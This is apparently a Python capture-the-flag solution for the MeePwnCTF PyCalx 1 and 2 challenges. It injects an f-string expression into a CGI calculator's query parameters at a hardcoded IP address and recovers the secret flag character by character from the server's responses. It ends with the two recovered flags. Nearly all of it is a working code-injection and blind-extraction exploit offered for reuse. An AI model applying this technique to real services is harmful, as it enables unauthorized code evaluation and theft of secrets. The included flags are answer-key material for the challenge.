from requests import get

# challenges about python3 f-string.
# solved pycalx 1,2 with same exploit code.

table = ' !"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~'
prev = ' '
flag = ""

url = "http://178.128.96.203/cgi-bin/server.py?value1=T&op=%2Bf&value2={1%20if%20FLAG%3E=source%20else%20sys.__package__}rue&source=" + flag
while True:
    for t in table:
        suck = url+"%{}".format(hex(ord(t))[2:])
        print suck
        c = get(suck)
        if c.text.find('Invalid') == -1:
            url += prev
            flag += prev
            print flag
            prev = ' '
            break
        prev = t
        

# PyCalx1 flag: MeePwnCTF{python3.66666666666666_([_((you_passed_this?]]]]]])}
# PyCalx2 flag: MeePwnCTF{python3.6[_strikes_backkkkkkkkkkkk)}
